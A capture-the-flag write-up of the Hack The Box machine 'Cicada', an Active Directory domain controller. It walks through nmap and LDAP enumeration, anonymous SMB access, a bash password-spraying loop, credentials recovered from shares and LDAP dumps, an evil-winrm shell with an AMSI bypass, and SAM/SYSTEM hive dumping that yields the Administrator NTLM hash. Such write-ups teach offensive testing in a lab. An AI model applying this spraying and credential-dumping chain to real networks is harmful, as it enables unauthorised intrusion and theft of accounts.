## Cicada -- Hack the box (10.129.1.36)


### Enumeration

I'll start out with an nmap scan 


	PORT      STATE SERVICE       REASON          VERSION
	53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
	88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-06 08:31:00Z)
	135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
	389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
	| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2024-08-22T20:24:16
	| Not valid after:  2025-08-22T20:24:16
	| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
	| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
	| -----BEGIN CERTIFICATE-----
	| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
	| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
	| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
	| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
	| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
	| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
	| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
	| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
	| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
	| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
	| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
	| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
	| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
	| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
	| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
	| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
	| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
	| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
	| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
	| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
	| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
	| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
	| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
	| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
	| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
	| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
	| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
	| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
	| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
	| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
	| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
	| ji6zxYOoOznp6JlmbakLb1ZRLA8=
	|_-----END CERTIFICATE-----
	|_ssl-date: TLS randomness does not represent time
	445/tcp   open  microsoft-ds? syn-ack ttl 127
	464/tcp   open  kpasswd5?     syn-ack ttl 127
	593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
	| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2024-08-22T20:24:16
	| Not valid after:  2025-08-22T20:24:16
	| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
	| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
	| -----BEGIN CERTIFICATE-----
	| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
	| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
	| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
	| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
	| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
	| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
	| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
	| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
	| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
	| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
	| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
	| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
	| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
	| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
	| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
	| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
	| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
	| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
	| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
	| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
	| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
	| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
	| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
	| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
	| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
	| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
	| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
	| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
	| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
	| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
	| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
	| ji6zxYOoOznp6JlmbakLb1ZRLA8=
	|_-----END CERTIFICATE-----
	|_ssl-date: TLS randomness does not represent time
	3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
	| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2024-08-22T20:24:16
	| Not valid after:  2025-08-22T20:24:16
	| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
	| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
	| -----BEGIN CERTIFICATE-----
	| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
	| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
	| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
	| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
	| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
	| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
	| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
	| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
	| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
	| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
	| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
	| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
	| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
	| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
	| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
	| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
	| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
	| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
	| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
	| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
	| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
	| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
	| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
	| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
	| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
	| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
	| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
	| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
	| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
	| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
	| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
	| ji6zxYOoOznp6JlmbakLb1ZRLA8=
	|_-----END CERTIFICATE-----
	|_ssl-date: TLS randomness does not represent time
	3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
	| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2024-08-22T20:24:16
	| Not valid after:  2025-08-22T20:24:16
	| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
	| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
	| -----BEGIN CERTIFICATE-----
	| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
	| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
	| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
	| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
	| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
	| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
	| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
	| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
	| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
	| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
	| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
	| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
	| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
	| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
	| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
	| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
	| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
	| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
	| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
	| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
	| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
	| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
	| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
	| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
	| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
	| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
	| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
	| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
	| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
	| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
	| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
	| ji6zxYOoOznp6JlmbakLb1ZRLA8=
	|_-----END CERTIFICATE-----
	|_ssl-date: TLS randomness does not represent time
	5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	56832/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running (JUST GUESSING): Microsoft Windows 2022 (89%)
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/5%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6701E892%P=aarch64-unknown-linux-gnu)
	SEQ(SP=106%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
	OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)
	WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
	ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
	T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=N)
	U1(R=N)
	IE(R=Y%DFI=N%TG=80%CD=Z)

	Uptime guess: 0.012 days (since Sat Oct  5 20:14:31 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=262 (Good luck!)
	IP ID Sequence Generation: Incremental
	Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

	Host script results:
	| smb2-time: 
	|   date: 2024-10-06T08:33:00
	|_  start_date: N/A
	|_clock-skew: 7h01m36s
	| p2p-conficker: 
	|   Checking for Conficker.C or higher...
	|   Check 1 (port 43742/tcp): CLEAN (Timeout)
	|   Check 2 (port 38087/tcp): CLEAN (Timeout)
	|   Check 3 (port 37650/udp): CLEAN (Timeout)
	|   Check 4 (port 24386/udp): CLEAN (Timeout)
	|_  0/4 checks are positive: Host is CLEAN or ports are blocked
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required

	TRACEROUTE (using port 445/tcp)
	HOP RTT      ADDRESS
	1   64.37 ms 10.10.14.1
	2   64.37 ms 10.129.1.36

There are a lot of ports open on Cicada. It appears to be a domain controller.

Domain: cicada.htb

FQDN: CICADA-DC.cicada.htb

![Nmap](/Cicada/images/nmap.png) 


Port 389, and 636 are open so I'll see if I can enumerate ldap at all.

	>>> import ldap3                                                                                                          >>> server = ldap3.Server('10.129.1.36', get_info = ldap3.ALL, port =389, use_ssl = False)                                
	>>> connection = ldap3.Connection(server)                                                                                 
	>>> connection.bind()                                                                                                     
	True                                                                                                                      
	>>> server.info                                                                                                           
	DSA info (from DSE):                                                                                                      
	  Supported LDAP versions: 3, 2                                                                                           
	  Naming contexts:                                                                                                        
	    DC=cicada,DC=htb                                                                                                      
	    CN=Configuration,DC=cicada,DC=htb                                                                                     
	    CN=Schema,CN=Configuration,DC=cicada,DC=htb                                                                           
	    DC=DomainDnsZones,DC=cicada,DC=htb                                                                                    
	    DC=ForestDnsZones,DC=cicada,DC=htb                                                                                    
	  Supported controls:                                                                                                     
	    1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT                                                           
	    1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT                                                              1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT                                                        
	    1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT                                                          
	    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT                                                         1.2.840.113556.1.4.1504 - Attribute scoped query - Control - MICROSOFT                                                
	    1.2.840.113556.1.4.1852 - User quota - Control - MICROSOFT                                                            
	    1.2.840.113556.1.4.1907 - Server shutdown notify - Control - MICROSOFT
	    


### SMB Enum

	$ smbclient -N -L 10.129.1.36

Running smbclient we get a list of several shares, and it looks like we may have at least read access to HR, and DEV. 


![smbclient](/Cicada/images/smbclient.png) 


We can connect to the HR share and there is a 'Notice from HR' text file that we can grab. It looks like the text file is to a new employee and it has a password but doesn't mention any usernames.

	Dear new hire!

	Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

	Your default password is: Cicada$M6Corpb*@Lp#nZp!8

	To change your password:

	1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
	2. Once logged in, navigate to your account settings or profile settings section.
	3. Look for the option to change your password. This will be labeled as "Change Password".
	4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
	5. After changing your password, make sure to save your changes.

	Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

	If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

	Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

	Best regards,
	Cicada Corp


From the note we pulled out of smb we can see there is a password but no usersnames. 


![smbclient](/Cicada/images/smb.png) 


To try and gather a list of usernames we can use crackmapexec against smb with an anonymous user NULL password and to brute force RID's.


Now we have a list of usernames that we can see what else they may have access to.


![smbclient](/Cicada/images/cme.png) 

Our list of users isn't formatted very well for practical use with tools. We can use the following command it make it more tool friendly.

	$ cat users_list.txt | cut -d ":" -f 2 | cut -d '\' -f 2 | cut -d " " -f 1 > newlist.txt 

![smbclient](/Cicada/images/list.png) 

Going forward I created a bash script that we can use with our updated list to see if any of user names we have can access the DEV SMB share we found earlier.

#!/bin/bash

	# Define variables
	password='PASSWORD'
	domain_or_ip="TARGET IP"
	share="DEV"   # replace with the SMB share you want to access

	# Loop through the file with usernames
	while IFS= read -r username; do
	    echo "Trying username: $username with password: $password"
	    
	    # Attempt to connect using smbclient
	    smbclient //$domain_or_ip/$share -U $username%$password -c exit

	    # Check the exit status to determine if the login was successful
	    if [ $? -eq 0 ]; then
		   echo "Login successful for user: $username"
	    else
		   echo "Login failed for user: $username"
	    fi
	done < "Name of the wordlist you want to use"


After updating the variables in the script with the target IP, password, and our wordlist we can see michael can access the \DEV share in smb. So that password that we found in the HR smb note must belong to michael because we now have the following valid credentials:

I wasn't able to access the DEV smb share with our new credentials. I'm going to try and run ldapdomaindump with our new credentials and see if we get anything interesting.

Username: michael.wrightson

Password: Cicada$M6Corpb*@Lp#nZp!8

![smbclient](/Cicada/images/smb-brute.png) 


	$ ldapdomaindump ldap://10.129.1.36 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'

The ldapdomaindump with Michaels credentials works. I'm going to load domain_users.html in a browser and enumerate some more.


![smbclient](/Cicada/images/ldap.png) 

Viewing the domain_users.html file we file more credentials.

Username: david.orelious

Password: aRt$Lp#7t*VQ!3


![smbclient](/Cicada/images/domain-users.png) 


Let's see if we can access the DEV smb share with david's credentials. Using David's credentials works to access the DEV smb share the we find a Backup powershell script that we can grab and enumerate.


![smbclient](/Cicada/images/david.png) 

Contents of the Backup powershell script give us credentials for 'emily.oscars' account.

Username: emily.oscars

Password: Q!3@Lp#M6b*7t*Vt


![smbclient](/Cicada/images/backup.png) 


Using crackmapexec we can see that emily has access to SMB and WINRM on the host. This is an easy win as we can now get a shell with emily's account with evil-winrm since port 5985 is open on the box.


![smbclient](/Cicada/images/emily.png) 

However, we can first use smbclient to connect to C$ drive and grab the user flag from 'emily.oscars.CICADA \ Desktop directory.


![smbclient](/Cicada/images/user.png) 

### Foothold / Exploitation


I'm going to go ahead an use evil-winrm to drop into a shell with emily's account. Evil-winrm also has another nice built in feature. Once we have a shell I can run the cmdlet 'Bypass-4MSI' to bypass Windows AMSI. It doesn't always work but it does this time. 

![smbclient](/Cicada/images/evil.png) 


We can now grab some registry information and download them to our attack box for further exploitation and enumeration. 

I'm able to grab the sam and system hive information on the target. It won't let me get the security hive information but I'm going to download the sam and system infomation to my attack box and run secretsdump against them.

### Privilege Esalation

Running secretsdump on my attack machine with the sam and system hive info gives me the Administrator hash. Now I can use the Administators hash with evil-winrm or psexec to get an Admin shell and have complete control over the box.

![smbclient](/Cicada/images/secret.png) 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

	[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
	[*] Cleaning up... 

![smbclient](/Cicada/images/root.png) 

And we now have root / administrator access on the box and can grab the root flag. This was a fun box. Until next time. Happy hacking ;) 
